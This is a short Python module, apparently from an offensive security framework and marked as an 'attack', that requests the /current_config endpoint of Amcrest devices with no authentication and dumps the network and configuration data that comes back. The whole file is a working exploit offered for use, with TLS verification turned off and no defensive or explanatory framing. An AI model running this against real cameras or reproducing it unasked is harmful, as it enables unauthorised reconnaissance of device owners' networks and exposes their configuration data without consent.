import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "amcrest/config_leak_attack"
        self.description = "Exploit module to harvest internal network setup and metadata parameters from Amcrest devices."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/current_config"
        else:
            url = f"{target.rstrip('/')}/current_config"
            
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Attempting to extract Amcrest current_config table...\033[0m")
                response = await client.get(url)
                
                if response.status_code == 200 and "table." in response.text:
                    preview = response.text[:400] + " \n[... Data Truncated for CLI Layout ...]"
                    return {
                        "success": True,
                        "details": f"Amcrest configuration data dumped successfully. Preview:\n{preview}"
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Exploit triggered but target framework rejected connection."}
